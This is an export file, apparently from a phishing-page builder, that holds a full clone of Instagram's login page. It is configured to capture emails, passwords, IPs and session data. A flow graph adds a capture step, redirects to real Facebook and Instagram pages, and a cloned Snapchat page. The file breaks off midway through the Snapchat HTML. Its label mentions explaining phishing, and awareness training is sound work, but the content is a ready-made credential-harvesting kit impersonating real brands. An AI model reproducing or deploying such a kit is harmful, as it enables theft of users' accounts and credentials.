{"format": "phe", "version": 1, "exported_at": "2026-09-21T05:01:37.291694", "page": {"name": "Explaning Phishing Mechanism", "capture_fields": ["email", "password", "timestamp", "ip", "session"], "html": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n\n<meta charset=\"utf-8\"/>\n<meta content=\"width=device-width, initial-scale=1.0\" name=\"viewport\"/>\n<title>Instagram</title>\n<link crossorigin=\"anonymous\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css\" integrity=\"sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==\" referrerpolicy=\"no-referrer\" rel=\"stylesheet\"/>\n<style>\n    * {\n        padding: 0;\n        margin: 0;\n        box-sizing: border-box;\n        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;\n    }\n\n    body {\n        height: 100vh;\n        background-color: #FAFAFA;\n        overflow-y: hidden;\n    }\n\n    .container {\n        display: flex;\n        justify-content: center;\n        margin: 60px 0;\n    }\n\n    .instagramAll {\n        margin-left: 30px;\n    }\n\n    .imagesAndTransistion {\n        position: relative;\n    }\n\n    .imagesAndTransistion > #frame1 > img {\n        height: 570px;\n        width: 290px;\n    }\n\n    .imagesAndTransistion > #frame2 > img:nth-child(1) {\n        height: 540px;\n        position: absolute;\n        top: -12px;\n        left: -90px;\n        z-index: -1;\n    }\n\n    .imagesAndTransistion > #frame2 > img:nth-child(2) {\n        height: 530px;\n        position: absolute;\n        top: 0;\n        left: -70px;\n        z-index: -2;\n    }\n\n    .transistionImages > img {\n        position: absolute;\n        top: 10px;\n        left: 16px;\n        transition: 1.5s ease-in;\n    }\n\n    /* Main Instagram box */\n    .instagramForm {\n        margin-top: 15px;\n        background-color: white;\n        border: 1px solid gainsboro;\n        border-radius: 12px;\n        height: fit-content;\n        padding: 10px 50px 20px;\n        width: 380px;\n    }\n\n    .insta-font {\n        display: flex;\n        justify-content: center;\n    }\n\n    .insta-font > img {\n        width: 200px;\n        height: 100px;\n        margin-bottom: 20px;\n    }\n\n    .inputs {\n        display: flex;\n        flex-direction: column;\n    }\n\n    /* Username / Email field */\n    .email > input[type=\"text\"]:focus,\n    .password > input[type=\"password\"]:focus,\n    .password > input[type=\"text\"]:focus {\n        outline: 0;\n        border: 1px solid rgb(189, 199, 159);\n    }\n\n    .email > input[type=\"text\"],\n    .password > input[type=\"password\"],\n    .password > input[type=\"text\"] {\n        height: 35px;\n        width: 100%;\n        margin-bottom: 10px;\n        border: 1px solid rgb(228, 228, 228);\n        border-radius: 7px;\n        padding: 10px 0 10px 10px;\n        font-size: 13px;\n        color: #262626;\n        background-color: transparent;\n    }\n\n    .password > input[type=\"password\"],\n    .password > input[type=\"text\"] {\n        padding-right: 45px;\n    }\n\n    /* Login button */\n    #login {\n        height: 35px;\n        border-radius: 10px;\n        color: white;\n        background-color: #4DB5F9;\n        font-weight: bold;\n        border: 0;\n        margin-bottom: 20px;\n        transition: 0.2s ease-in;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n        gap: 8px;\n    }\n\n    #login i {\n        font-size: 13px;\n    }\n\n    .or {\n        position: relative;\n    }\n\n    #or {\n        align-items: center;\n        text-align: center;\n        align-content: center;\n        padding: 10px;\n        background-color: rgb(255, 255, 255);\n        border-radius: 100%;\n        position: absolute;\n        top: -17px;\n        left: 115px;\n        font-size: 13px;\n        font-weight: bold;\n    }\n\n    .loginWithFacebook {\n        margin: 20px auto;\n    }\n\n    .loginWithFacebook i {\n        font-size: 20px;\n        margin-right: 5px;\n    }\n\n    .loginWithFacebook > a {\n        text-decoration: none;\n        font-size: 15px;\n        font-weight: 500;\n        margin: auto;\n        color: #385185;\n    }\n\n    #forget {\n        margin: 0 auto;\n        font-size: 14px;\n    }\n\n    #forget a {\n        text-decoration: none;\n        color: #385989;\n    }\n\n    /* Don't have an account box */\n    .no-account {\n        border: 1px solid gainsboro;\n        background-color: white;\n        width: 380px;\n        text-align: center;\n        padding: 15px;\n        margin: 10px 0;\n        font-size: 16px;\n        border-radius: 12px;\n    }\n\n    .no-account a {\n        text-decoration: none;\n        color: #0095F6;\n        font-weight: 500;\n    }\n\n    /* Meta section */\n    .meta-section {\n        text-align: center;\n        margin: 20px 0 15px;\n    }\n\n    .meta-logo {\n        display: flex;\n        justify-content: center;\n        align-items: center;\n        gap: 6px;\n        font-size: 20px;\n        font-weight: 600;\n        color: #262626;\n    }\n\n    .meta-logo i {\n        font-size: 23px;\n    }\n\n    .downloadLinks {\n        display: flex;\n        justify-content: space-around;\n        margin: 0 30px;\n    }\n\n    .downloadLinks img {\n        width: 25px;\n        height: 25px;\n        margin: 10px 5px 0 10px;\n    }\n\n    .googlePlay,\n    .microsoft {\n        display: flex;\n    }\n\n    .btn {\n        width: 140px;\n        background-color: black;\n        color: white;\n        padding-bottom: 5px;\n        border-radius: 5px;\n        cursor: pointer;\n    }\n\n    .btn:active {\n        opacity: 0.7;\n    }\n\n    .btn span {\n        font-size: 10px;\n    }\n\n    .email,\n    .password {\n        position: relative;\n    }\n\n    #emailPlaceholder,\n    #passwordPlaceholder {\n        position: absolute;\n        top: 8px;\n        left: 5px;\n        padding-left: 6px;\n        font-size: 12px;\n        opacity: 0.7;\n        pointer-events: none;\n        transition: 0.1s ease;\n    }\n\n    /* Password eye */\n    #showOrHide {\n        position: absolute;\n        right: 12px;\n        top: 9px;\n        cursor: pointer;\n        font-size: 16px;\n        color: #262626;\n        transition: 0.15s ease;\n    }\n\n    #showOrHide:hover {\n        opacity: 0.6;\n    }\n\n    .fadingImages {\n        width: 260px;\n        overflow: hidden;\n        height: 550px;\n        z-index: -1;\n    }\n\n    @media (max-width: 950px) {\n        .imagesAndTransistion {\n            display: none;\n        }\n    }\n</style><style data-phishhunt-clone=\"true\">[content-visibility]{content-visibility:visible!important}[style*=content-visibility]{content-visibility:visible!important}*{visibility:visible!important;opacity:1!important}</style><style data-phishhunt-clone=\"true\">[content-visibility]{content-visibility:visible!important}[style*=content-visibility]{content-visibility:visible!important}*{visibility:visible!important;opacity:1!important}</style></head><body><p>\n.\n\n\n\n</p>\n<div class=\"container\">\n<div class=\"imagesAndTransistion\">\n<div id=\"frame1\">\n<img alt=\"\" src=\"https://raw.githubusercontent.com/mahesh00009/instagram/main/mobile-frame4.png\"/>\n</div>\n<div id=\"frame2\">\n<img alt=\"\" src=\"https://raw.githubusercontent.com/mahesh00009/instagram/main/mobile-frame3.png\"/>\n<img alt=\"\" src=\"https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot4.png\"/>\n</div>\n<div class=\"transistionImages\">\n<img alt=\"\" class=\"fadingImages\" src=\"https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot5.png\"/>\n<img alt=\"\" class=\"fadingImages\" src=\"https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot3.png\"/>\n<img alt=\"\" class=\"fadingImages\" src=\"https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot2.png\"/>\n<img alt=\"\" class=\"fadingImages\" src=\"https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot1.png\"/>\n</div>\n</div>\n<div class=\"instagramAll\">\n<div class=\"instagramForm\">\n<div class=\"insta-font\">\n<img alt=\"\" src=\"https://raw.githubusercontent.com/mahesh00009/instagram/main/instagram-font.png\"/>\n</div>\n<div class=\"inputs\">\n<div class=\"email\">\n<input id=\"email\" oninput=\"check()\" type=\"text\"/>\n<span id=\"emailPlaceholder\">Phone number, username, or email</span>\n</div>\n<div class=\"password\">\n<input id=\"password\" oninput=\"check()\" type=\"password\"/>\n<span id=\"passwordPlaceholder\">Password</span>\n<span id=\"showOrHide\" onclick=\"showOrHide1()\"></span>\n</div>\n<button disabled=\"\" id=\"login\">\n<i class=\"fa-solid fa-lock\" id=\"loginIcon\"></i>\n<span>Log in</span>\n</button>\n<div class=\"or\">\n<hr/>\n<span id=\"or\">OR</span>\n</div>\n<div class=\"loginWithFacebook\">\n<a href=\"#\">\n<i class=\"fa-brands fa-facebook\"></i>\n<span>Log in with Facebook</span>\n</a>\n</div>\n<p id=\"forget\">\n<a href=\"#\">Forgot password?</a>\n</p>\n</div>\n</div>\n<div class=\"no-account\">\n<p id=\"noAccount\">\n                Don't have an account?\n                <span><a href=\"#\">Sign up</a></span>\n</p>\n</div>\n<!-- Meta -->\n<div class=\"meta-section\">\n<div class=\"meta-logo\">\n<i class=\"fa-brands fa-meta\"></i>\n<span>Meta</span>\n</div>\n</div>\n</div>\n</div>\n<script>\n    const email = document.getElementById(\"email\");\n    const password = document.getElementById(\"password\");\n\n    const emailPlaceholder = document.getElementById(\"emailPlaceholder\");\n    const passwordPlaceholder = document.getElementById(\"passwordPlaceholder\");\n\n    const showOrHide = document.getElementById(\"showOrHide\");\n    const login = document.getElementById(\"login\");\n    const loginIcon = document.getElementById(\"loginIcon\");\n\n    const fadingImages = document.querySelectorAll(\".fadingImages\");\n\n    /* Slideshow */\n    function displayImages(from, to) {\n        let current = to;\n\n        setInterval(function () {\n\n            fadingImages[current].style.opacity = \"0\";\n\n            if (current == from) {\n                current = to + 1;\n            }\n\n            current--;\n\n            fadingImages[current].style.opacity = \"1\";\n\n        }, 4000);\n    }\n\n    displayImages(0, 3);\n\n    /* Input handling */\n    function check() {\n\n        /* Username / Email */\n\n        if (email.value === \"\") {\n\n            emailPlaceholder.style.fontSize = \"12px\";\n            emailPlaceholder.style.top = \"8px\";\n            emailPlaceholder.style.opacity = \"0.7\";\n            email.style.paddingTop = \"\";\n\n        } else {\n\n            emailPlaceholder.style.fontSize = \"10px\";\n            emailPlaceholder.style.top = \"3px\";\n            emailPlaceholder.style.opacity = \"0.7\";\n            email.style.fontSize = \"12px\";\n            email.style.paddingTop = \"20px\";\n        }\n\n        /* Password */\n\n        if (password.value === \"\") {\n\n            passwordPlaceholder.style.fontSize = \"12px\";\n            passwordPlaceholder.style.top = \"8px\";\n            passwordPlaceholder.style.opacity = \"0.7\";\n            password.style.paddingTop = \"\";\n\n            showOrHide.className = \"\";\n\n        } else {\n\n            passwordPlaceholder.style.fontSize = \"10px\";\n            passwordPlaceholder.style.top = \"3px\";\n            passwordPlaceholder.style.opacity = \"0.7\";\n            password.style.fontSize = \"12px\";\n            password.style.paddingTop = \"20px\";\n\n            /* Eye slash when password is hidden */\n            if (password.type === \"password\") {\n                showOrHide.className = \"fa-solid fa-eye-slash\";\n            } else {\n                showOrHide.className = \"fa-solid fa-eye\";\n            }\n        }\n\n        /* Login button */\n\n        if (email.value !== \"\" && password.value !== \"\") {\n\n            login.style.backgroundColor = \"#049bff\";\n            login.style.cursor = \"pointer\";\n            login.disabled = false;\n\n            /* Unlock */\n            loginIcon.className = \"fa-solid fa-lock-open\";\n\n        } else {\n\n            login.style.backgroundColor = \"#4DB5F9\";\n            login.style.cursor = \"default\";\n            login.disabled = true;\n\n            /* Lock */\n            loginIcon.className = \"fa-solid fa-lock\";\n        }\n    }\n\n    /* Show / Hide password */\n    function showOrHide1() {\n\n        if (password.value === \"\") {\n            return;\n        }\n\n        if (password.type === \"password\") {\n\n            password.type = \"text\";\n\n            /* Normal eye when visible */\n            showOrHide.className = \"fa-solid fa-eye\";\n\n        } else {\n\n            password.type = \"password\";\n\n            /* Striked eye when hidden */\n            showOrHide.className = \"fa-solid fa-eye-slash\";\n        }\n    }\n\n    /* Set initial login state */\n    check();\n</script>\n</body></html>\n"}, "flow": {"nodes": [{"id": "start_mu8aqdi6_1", "type": "preview", "x": 992, "y": 885, "width": 480, "height": 270, "data": {"label": "Explaning UI", "ratio": "16:9", "buttonStates": {}, "buttons": {"#login": {"x": 980.888916015625, "y": 317.22222900390625, "w": 278.22222900390625, "h": 35}, "body:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(4) > a:nth-of-type(1)": {"x": 1033.2083740234375, "y": 394.8888854980469, "w": 173.5833282470703, "h": 19.55555534362793}, "#forget > a:nth-of-type(1)": {"x": 1065.0555419921875, "y": 435.3333435058594, "w": 109.875, "h": 18.66666603088379}, "#noAccount > span:nth-of-type(1) > a:nth-of-type(1)": {"x": 1177.2222900390625, "y": 500.77777099609375, "w": 55.25, "h": 21.33333396911621}}, "dfRects": {}}}, {"id": "act_mu8asgdq_2", "type": "url", "x": 1648, "y": 1151, "width": 230, "height": 104, "data": {"label": "Facebook Link", "url": "https://m.facebook.com/"}}, {"id": "act_mu8athvb_5", "type": "url", "x": 1648, "y": 1266, "width": 230, "height": 104, "data": {"label": "Forget Password", "url": "https://www.instagram.com/accounts/password/reset/"}}, {"id": "act_mu8au8mi_8", "type": "url", "x": 1649, "y": 1383, "width": 230, "height": 104, "data": {"label": "Sign Up", "url": "https://www.instagram.com/accounts/emailsignup/"}}, {"id": "act_mu8auszj_11", "type": "capture", "x": 1467, "y": 763, "width": 230, "height": 104, "data": {}}, {"id": "act_mu8av220_14", "type": "new_page", "x": 1681, "y": 908, "width": 400, "height": 225, "data": {"label": "Snap Username", "htmlContent": "<html prefix=\"og: https://ogp.me/ns#\" lang=\"en-GB\" dir=\"ltr\" data-theme=\"light\" data-react-helmet=\"prefix,lang,dir\"><head><meta name=\"next-head-count\" content=\"0\"><script>(function(){try{var u=null;try{var h=window.location.host;if(h.indexOf('localhost')>=0||h.indexOf('sc-corp')>=0||h.indexOf('bs-local.com')>=0||h.slice(-5)==='.snap'){var v=new URLSearchParams(window.location.search).get('theme');if(v==='light'||v==='dark')u=v;}}catch(e){}var s=null;try{s=localStorage.getItem('theme');}catch(e){}var d=window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches;document.documentElement.setAttribute('data-theme',u||s||(d?'dark':'light'));}catch(e){}})();</script><link data-react-helmet=\"true\" rel=\"preload\" href=\"https://static.snapchat.com/videos/snapchat-dot-com/posters/find-your-friends.png\" as=\"image\" fetchpriority=\"high\"><link data-react-helmet=\"true\" rel=\"preload\" href=\"https://static.snapchat.com/videos/snapchat-dot-com/posters/lens.png\" as=\"image\" fetchpriority=\"high\"><link data-react-helmet=\"true\" rel=\"canonical\" href=\"https://www.snapchat.com\"><link data-react-helmet=\"true\" rel=\"apple-touch-icon\" href=\"https://static.snapchat.com/images/apple-touch-icon/apple-touch-icon-yellow-180.png\"><link data-react-helmet=\"true\" rel=\"apple-touch-icon\" sizes=\"180x180\" href=\"https://static.snapchat.com/images/apple-touch-icon/apple-touch-icon-yellow-180.png\"><link data-react-helmet=\"true\" rel=\"apple-touch-icon\" sizes=\"192x192\" href=\"https://static.snapchat.com/images/apple-touch-icon/apple-touch-icon-yellow-192.png\"><link data-react-helmet=\"true\" rel=\"icon\" type=\"image/png\" sizes=\"192x192\" href=\"https://static.snapchat.com/images/favicon/favicon-192x192.png\"><link data-react-helmet=\"true\" rel=\"icon\" type=\"image/x-icon\" href=\"https://static.snapchat.com/favicon.ico\"><meta data-react-helmet=\"true\" property=\"og:title\" content=\"Snapchat – Say it in a Snap\"><meta data-react-helmet=\"true\" property=\"og:type\" content=\"website\"><meta data-react-helmet=\"true\" property=\"og:url\" content=\"https://www.snapchat.com\"><meta data-react-helmet=\"true\" property=\"og:image\" content=\"https://www.snapchat.com/images/default-preview/facebook.png\"><meta data-react-helmet=\"true\" property=\"og:image:width\" content=\"1200\"><meta data-react-helmet=\"true\" property=\"og:image:height\" content=\"628\"><meta data-react-helmet=\"true\" property=\"og:site_name\" content=\"Snapchat\"><meta data-react-helmet=\"true\" property=\"og:description\" content=\"Chat, send Snaps, explore Stories and try Lenses on desktop, or download the app on mobile! See how to connect and create with friends on Snapchat, wherever you are.\"><meta data-react-helmet=\"true\" property=\"fb:app_id\" content=\"394343577431007\"><meta data-react-helmet=\"true\" property=\"twitter:card\" content=\"summary_large_image\"><meta data-react-helmet=\"true\" property=\"twitter:site\" content=\"@Snapchat\"><meta data-react-helmet=\"true\" property=\"twitter:title\" content=\"Snapchat – Say it in a Snap\"><meta data-react-helmet=\"true\" property=\"twitter:image\" content=\"https://www.snapchat.com/images/default-preview/twitter.png\"><meta data-react-helmet=\"